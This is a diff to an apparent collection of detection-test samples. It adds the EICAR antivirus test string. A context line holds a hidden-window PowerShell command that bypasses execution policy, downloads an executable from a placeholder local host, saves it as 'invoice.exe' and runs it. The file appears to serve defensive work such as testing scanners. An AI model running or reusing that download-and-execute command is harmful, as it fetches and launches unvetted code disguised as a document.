@@ -107,6 +107,11 @@ powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionP
 powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\project\\invoice.exe');Start-Process 'C:\\project\invoice.exe'
 ```
 
+`EICAR` string
+```
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*<removeme>
+```
+
 
 ## 3. Suspicious powershell script
 ```powershell
